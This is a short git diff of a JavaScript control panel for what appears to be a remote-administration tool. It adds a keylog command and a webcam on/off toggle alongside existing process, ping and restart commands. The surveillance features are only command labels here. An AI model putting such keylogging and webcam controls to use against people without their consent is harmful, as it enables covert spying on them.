@@ -8,7 +8,6 @@ function sendCommand(cmd) {
   }
 }
 
-
 function getProcessCmd() {
   sendCommand("CMD_GET_PROCESS");
 }
@@ -23,6 +22,29 @@ function getAppsCmd() {
 
 function getPingCmd() {
   sendCommand("CMD_PING");
+}
+
+function getKeyLog() {
+  sendCommand("CMD_KEY_LOG");
+}
+
+function toggleWebcam() {
+  const command = document.getElementById("webcam-cmd");
+
+  // Webcam is ON when the text says "Off"
+  const webcamIsOn = command.textContent.trim().toLowerCase() === "off";
+
+  if (!webcamIsOn) {
+    // Webcam is OFF → ask to turn ON
+    if (confirm("CẢNH BÁO: Bạn có muốn mở camera?")) {
+      sendCommand("CMD_CAM_ON");
+      command.textContent = "Off"; // show "Off" because webcam is now ON
+    }
+  } else {
+    // Webcam is ON → turn OFF
+    sendCommand("CMD_CAM_OFF");
+    command.textContent = "On"; // show "On" because webcam is now OFF
+  }
 }
 
 function restartCmd() {
